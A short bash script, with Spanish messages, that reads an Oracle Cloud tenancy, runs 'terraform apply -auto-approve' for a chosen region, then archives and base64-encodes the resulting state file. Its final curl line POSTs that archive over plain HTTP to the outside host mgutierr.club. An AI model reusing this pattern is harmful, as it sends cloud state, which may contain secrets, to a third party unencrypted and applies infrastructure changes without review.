#!/bin/bash
export TF_VAR_tenancy_ocid=$(oci iam compartment list | jq -r '.data[]."compartment-id"' | sort -u)
export NOMBRE=$(oci iam compartment get --compartment-id $TF_VAR_tenancy_ocid | jq -r '.data.name')
echo Tenancy $NOMBRE $TF_VAR_tenancy_ocid
if [ a$1 == a ]; then
	echo debe especificar region como una de
	oci iam region-subscription list | jq -r '.data[]."region-name"'
	exit
fi
export TF_VAR_region=$1
export F=$NOMBRE.$TF_VAR_region
terraform init
terraform apply -auto-approve -state=$F.salida
tar cvfz $F.tar.gz $F.salida
cat << EOF > $F.json
{ "origen":"$F","inventario":"$(base64 $F.tar.gz)", "fecha": "$(date)" }
EOF
curl -d @$F.json http://mgutierr.club
echo "Proceso Terminado"

